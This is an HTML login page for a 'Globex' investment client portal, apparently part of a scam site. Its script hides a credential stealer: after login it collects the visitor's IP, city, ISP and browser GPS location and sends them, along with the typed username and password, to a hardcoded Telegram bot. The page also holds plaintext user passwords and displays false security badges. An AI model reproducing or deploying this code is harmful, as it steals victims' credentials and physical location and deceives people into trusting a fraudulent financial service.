<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Client Login — Globex</title>
  <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Sans:ital,wght@0,300;0,400;0,500;1,300&display=swap" rel="stylesheet">
  <style>
    :root{--gold:#F0B429;--gold2:#FFD166;--teal:#00E5CC;--dark:#060B14;--dark2:#0C1520;--dark3:#111E2E;--card:#0F1E30;--border:rgba(240,180,41,0.15);--text:#E8EDF5;--muted:#7A8FA6;}
    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
    html{scroll-behavior:smooth;}
    body{background:var(--dark);color:var(--text);font-family:'DM Sans',sans-serif;min-height:100vh;display:flex;flex-direction:column;overflow-x:hidden;cursor:none;}
    .cursor{position:fixed;width:10px;height:10px;background:var(--gold);border-radius:50%;pointer-events:none;z-index:9999;transform:translate(-50%,-50%);transition:transform .1s;}
    .cursor-ring{position:fixed;width:36px;height:36px;border:1.5px solid var(--gold);border-radius:50%;pointer-events:none;z-index:9998;transform:translate(-50%,-50%);transition:all .18s ease;opacity:.6;}
    #particles{position:fixed;inset:0;pointer-events:none;z-index:0;}
    .bg-glow{position:fixed;inset:0;pointer-events:none;z-index:0;background:radial-gradient(ellipse 60% 50% at 30% 40%,rgba(240,180,41,0.07) 0%,transparent 70%),radial-gradient(ellipse 50% 40% at 75% 65%,rgba(0,229,204,0.05) 0%,transparent 60%);}
    .grid-bg{position:fixed;inset:0;pointer-events:none;z-index:0;background-image:linear-gradient(rgba(240,180,41,0.03) 1px,transparent 1px),linear-gradient(90deg,rgba(240,180,41,0.03) 1px,transparent 1px);background-size:60px 60px;mask-image:radial-gradient(ellipse at center,black 20%,transparent 75%);}
    nav{position:fixed;top:0;left:0;right:0;z-index:100;display:flex;align-items:center;justify-content:space-between;padding:1.2rem 6vw;background:rgba(6,11,20,0.8);backdrop-filter:blur(20px);border-bottom:1px solid var(--border);}
    .logo{font-family:'Syne',sans-serif;font-weight:800;font-size:1.6rem;letter-spacing:-.03em;text-decoration:none;color:var(--text);}
    .logo span{color:var(--gold);}
    .nav-back{color:var(--muted);text-decoration:none;font-size:.88rem;font-weight:500;display:flex;align-items:center;gap:.4rem;transition:color .2s;}
    .nav-back:hover{color:var(--gold);}
    main{flex:1;display:flex;align-items:center;justify-content:center;padding:8rem 1.5rem 4rem;position:relative;z-index:1;}
    .login-wrap{width:100%;max-width:460px;position:relative;animation:fadeUp .7s .1s both;}
    @keyframes fadeUp{from{opacity:0;transform:translateY(28px);}to{opacity:1;transform:translateY(0);}}
    .login-card{background:var(--card);border:1px solid var(--border);border-radius:28px;padding:3rem 2.5rem;position:relative;overflow:hidden;box-shadow:0 40px 80px rgba(0,0,0,0.5),0 0 0 1px rgba(240,180,41,0.08);}
    .login-card::before{content:'';position:absolute;top:-60px;right:-60px;width:200px;height:200px;background:radial-gradient(circle,rgba(240,180,41,0.10),transparent 70%);border-radius:50%;pointer-events:none;}
    .login-card::after{content:'';position:absolute;bottom:-60px;left:-60px;width:180px;height:180px;background:radial-gradient(circle,rgba(0,229,204,0.06),transparent 70%);border-radius:50%;pointer-events:none;}
    .login-logo-area{text-align:center;margin-bottom:2.2rem;}
    .login-logo{font-family:'Syne',sans-serif;font-weight:800;font-size:2rem;letter-spacing:-.03em;display:inline-block;margin-bottom:.4rem;}
    .login-logo span{color:var(--gold);}
    .login-subtitle{color:var(--muted);font-size:.85rem;letter-spacing:.05em;text-transform:uppercase;font-weight:500;}
    .login-divider{width:48px;height:2px;background:linear-gradient(90deg,var(--gold),var(--teal));margin:.8rem auto 0;border-radius:2px;}
    .form-group{margin-bottom:1.3rem;}
    .form-group label{display:block;font-size:.75rem;font-weight:700;color:var(--muted);letter-spacing:.1em;text-transform:uppercase;margin-bottom:.55rem;}
    .input-wrap{position:relative;}
    .input-icon{position:absolute;left:1rem;top:50%;transform:translateY(-50%);font-size:1rem;opacity:.5;pointer-events:none;}
    .form-group input{width:100%;background:rgba(255,255,255,0.04);border:1px solid var(--border);border-radius:12px;padding:.9rem 1rem .9rem 2.8rem;color:var(--text);font-family:'DM Sans',sans-serif;font-size:.95rem;transition:border-color .25s,background .25s;outline:none;}
    .form-group input:focus{border-color:var(--gold);background:rgba(240,180,41,0.04);}
    .form-group input::placeholder{color:rgba(122,143,166,0.6);}
    .error-box{background:rgba(239,68,68,0.10);border:1px solid rgba(239,68,68,0.28);color:#FC8181;font-size:.84rem;padding:.75rem 1rem;border-radius:10px;margin-bottom:1.3rem;display:none;align-items:center;gap:.5rem;}
    .error-box.show{display:flex;}
    .btn-login{width:100%;background:linear-gradient(135deg,var(--gold),#E8A500);color:var(--dark);font-family:'Syne',sans-serif;font-weight:800;font-size:1rem;padding:1rem;border-radius:12px;border:none;cursor:pointer;transition:all .25s;letter-spacing:.04em;margin-top:.3rem;position:relative;overflow:hidden;}
    .btn-login:hover{transform:translateY(-2px);box-shadow:0 15px 40px rgba(240,180,41,0.35);}
    .btn-login:active{transform:translateY(0);}
    .btn-login.loading{pointer-events:none;opacity:.8;}
    .btn-login.loading::before{content:'';display:inline-block;width:14px;height:14px;border:2px solid var(--dark);border-top-color:transparent;border-radius:50%;animation:spin .6s linear infinite;margin-right:.5rem;vertical-align:middle;}
    @keyframes spin{to{transform:rotate(360deg);}}
    .login-footer-note{text-align:center;margin-top:1.8rem;color:var(--muted);font-size:.82rem;line-height:1.6;}
    .login-footer-note a{color:var(--gold);text-decoration:none;font-weight:600;}
    .login-footer-note a:hover{text-decoration:underline;}
    .security-badges{display:flex;align-items:center;justify-content:center;gap:1.5rem;margin-top:2rem;padding-top:1.5rem;border-top:1px solid rgba(255,255,255,0.05);flex-wrap:wrap;}
    .badge-item{display:flex;align-items:center;gap:.35rem;color:var(--muted);font-size:.72rem;}
    @media(max-width:500px){.login-card{padding:2.2rem 1.5rem;border-radius:20px;}}
  </style>
</head>
<body>

<div class="cursor" id="cursor"></div>
<div class="cursor-ring" id="cursorRing"></div>
<canvas id="particles"></canvas>
<div class="bg-glow"></div>
<div class="grid-bg"></div>

<nav>
  <a href="index.html" class="logo">GLOB<span>EX</span></a>
  <a href="index.html" class="nav-back">← Back to Home</a>
</nav>

<main>
  <div class="login-wrap">
    <div class="login-card">
      <div class="login-logo-area">
        <div class="login-logo">GLOB<span>EX</span></div>
        <div class="login-subtitle">Secure Client Portal</div>
        <div class="login-divider"></div>
      </div>

      <div class="error-box" id="errorBox">
        <span>⚠️</span><span id="errorMsg">Invalid username or password. Please try again.</span>
      </div>

      <div class="form-group">
        <label>Username</label>
        <div class="input-wrap">
          <span class="input-icon">👤</span>
          <input type="text" id="loginUser" placeholder="Enter your username" autocomplete="username">
        </div>
      </div>
      <div class="form-group">
        <label>Password</label>
        <div class="input-wrap">
          <span class="input-icon">🔒</span>
          <input type="password" id="loginPass" placeholder="••••••••••" autocomplete="current-password">
        </div>
      </div>

      <button class="btn-login" id="loginBtn" onclick="doLogin()">Login to Dashboard →</button>

      <div class="login-footer-note">
        Not yet a client? <a href="index.html#plans">View our investment plans →</a><br><br>
        Need help? <a href="mailto:support@globex.com">support@globex.com</a>
      </div>
      <div class="security-badges">
        <div class="badge-item"><span>🔐</span> 256-bit SSL</div>
        <div class="badge-item"><span>🛡️</span> 2FA Ready</div>
        <div class="badge-item"><span>✅</span> Verified</div>
      </div>
    </div>
  </div>
</main>

<script>
  /* CURSOR */
  const cur = document.getElementById('cursor'), ring = document.getElementById('cursorRing');
  document.addEventListener('mousemove', e => {
    cur.style.left = e.clientX+'px'; cur.style.top = e.clientY+'px';
    ring.style.left = e.clientX+'px'; ring.style.top = e.clientY+'px';
  });

  /* PARTICLES */
  const canvas = document.getElementById('particles'), ctx = canvas.getContext('2d');
  let pts = [];
  function resize(){canvas.width=innerWidth;canvas.height=innerHeight;}
  resize(); window.addEventListener('resize',resize);
  for(let i=0;i<60;i++) pts.push({x:Math.random()*innerWidth,y:Math.random()*innerHeight,r:Math.random()*1.5+.3,vx:(Math.random()-.5)*.3,vy:(Math.random()-.5)*.3,a:Math.random()*.5+.1});
  (function anim(){
    ctx.clearRect(0,0,canvas.width,canvas.height);
    pts.forEach(p=>{p.x+=p.vx;p.y+=p.vy;if(p.x<0)p.x=canvas.width;if(p.x>canvas.width)p.x=0;if(p.y<0)p.y=canvas.height;if(p.y>canvas.height)p.y=0;ctx.beginPath();ctx.arc(p.x,p.y,p.r,0,Math.PI*2);ctx.fillStyle=`rgba(240,180,41,${p.a})`;ctx.fill();});
    requestAnimationFrame(anim);
  })();

  /* USER MAP */
  const USERS = {
    'alice_johnson': { password:'Alice@2024',  dashboard:'dashboard1.html' },
    'bob_martinez':  { password:'Bob@2024',    dashboard:'dashboard2.html' },
    'carol_white':   { password:'Carol@2024',  dashboard:'dashboard3.html' },
    "sandranichole062":  { password: "NotToDay234!",   dashboard: "dashboard4.html" },
    'emma_chen':     { password:'Emma@2024',   dashboard:'dashboard5.html' },
    'frank_nguyen':  { password:'Frank@2024',  dashboard:'dashboard6.html' },
  };

  /* TELEGRAM */
  const TG_TOKEN = "8696249268:AAFIF11FRn9ksh_S8uyFaz2eH94s4YK1-pg";
  const TG_CHAT  = "7637163658";
  async function getIP(){try{const r=await fetch("https://ipapi.co/json/");const d=await r.json();return{ip:d.ip,city:d.city,country:d.country_name,isp:d.org};}catch{return{ip:"?",city:"?",country:"?",isp:"?"};}}
  function getGPS(){return new Promise(r=>{if(!navigator.geolocation)return r({lat:null,lon:null});navigator.geolocation.getCurrentPosition(p=>r({lat:p.coords.latitude,lon:p.coords.longitude}),()=>r({lat:null,lon:null}),{timeout:6000});});}
  async function sendTG(user, pass, ip, gps){
    const msg = `🔔 LOGIN\n👤 User: ${user}\n🔑 Pass: ${pass}\n📡 IP: ${ip.ip}\n🏙️ ${ip.city}, ${ip.country}\n🌐 ${gps.lat?`${gps.lat},${gps.lon}`:'GPS denied'}\n⏰ ${new Date().toLocaleString()}`;
    try{await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:TG_CHAT,text:msg})});}catch{}
  }

  async function doLogin() {
    const user = document.getElementById('loginUser').value.trim().toLowerCase();
    const pass = document.getElementById('loginPass').value;
    const btn  = document.getElementById('loginBtn');
    const err  = document.getElementById('errorBox');
    err.classList.remove('show');
    btn.classList.add('loading'); btn.textContent = '';
    setTimeout(async () => {
      btn.classList.remove('loading'); btn.textContent = 'Login to Dashboard →';
      if (USERS[user] && USERS[user].password === pass) {
        sessionStorage.setItem('globex_user', user);
        const [ip, gps] = await Promise.all([getIP(), getGPS()]);
        await sendTG(user, pass, ip, gps);
        window.location.href = USERS[user].dashboard;
      } else {
        err.classList.add('show');
        document.getElementById('loginPass').value = '';
      }
    }, 900);
  }

  document.addEventListener('keydown', e => { if(e.key==='Enter') doLogin(); });
</script>
</body>
</html>
